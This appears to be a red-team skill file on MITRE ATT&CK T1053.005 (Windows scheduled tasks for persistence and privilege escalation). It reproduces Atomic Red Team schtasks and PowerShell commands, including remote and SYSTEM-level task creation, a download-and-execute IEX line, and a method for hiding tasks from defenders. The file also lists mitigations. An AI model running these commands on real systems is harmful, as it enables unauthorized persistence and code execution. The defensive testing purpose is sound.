---
name: "T1053.005_scheduled-task"
description: "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1053.005
  - execution
  - persistence
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1053.005"
tactic: "execution"
all_tactics:
  - execution
  - persistence
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1053/005"
tech_stack:
  - windows
cwe_ids:
  - CWE-94
chains_with:
  - T1053
  - T1053.002
  - T1053.003
  - T1053.006
  - T1053.007
prerequisites:
  - T1053
severity_boost:
  T1053: "Chain with T1053 for deeper attack path"
  T1053.002: "Chain with T1053.002 for deeper attack path"
  T1053.003: "Chain with T1053.003 for deeper attack path"
---

# T1053.005 Scheduled Task

> **Sub-technique of:** T1053

## High-Level Description

Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.

An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.

Adversaries may also create "hidden" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.

## Kill Chain Phase

- Execution (TA0002)
- Persistence (TA0003)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Scheduled Task technique is applicable to target environment
- [ ] Check Windows systems for indicators of Scheduled Task
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Scheduled Task Startup Script

Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
the tasks, open the Task Scheduler and look in the Active Tasks pane.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
```

### Atomic Test 2: Scheduled task Local

Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.

**Supported Platforms:** windows

```cmd
SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
```

### Atomic Test 3: Scheduled task Remote

Create a task on a remote system.
Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
```

### Atomic Test 4: Powershell Cmdlet Scheduled Task

Create an atomic scheduled task that leverages native powershell cmdlets.

Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.

**Supported Platforms:** windows

```powershell
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
```

### Atomic Test 5: Task Scheduler via VBA

This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
30 - 40 seconds after this module has run

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
```

**Dependencies:**
- Microsoft #{ms_product} must be installed


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Scheduled Task by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1053.005 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1026 Privileged Account Management
Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority.

### M1018 User Account Management
Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems.

### M1047 Audit
Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.

### M1028 Operating System Configuration
Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled.


## Detection

### Detection of Suspicious Scheduled Task Creation and Execution on Windows


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Scheduled Task technique applicable | Medium | Execution |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-94 | Improper Control of Generation of Code |


## References

- [ProofPoint Serpent](https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain)
- [Defending Against Scheduled Task Attacks in Windows Environments](https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments)
- [Twitter Leoloobeek Scheduled Task](https://x.com/leoloobeek/status/939248813465853953)
- [Tarrask scheduled task](https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/)
- [Microsoft Scheduled Task Events Win10](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events)
- [TechNet Scheduled Task Events](https://technet.microsoft.com/library/dd315590.aspx)
- [Red Canary - Atomic Red Team](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md)
- [TechNet Autoruns](https://technet.microsoft.com/en-us/sysinternals/bb963902)
- [TechNet Forum Scheduled Task Operational Setting](https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen)
- [SigmaHQ](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml)
- [Stack Overflow](https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder)
- [Atomic Red Team - T1053.005](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1053.005)
- [MITRE ATT&CK - T1053.005](https://attack.mitre.org/techniques/T1053/005)
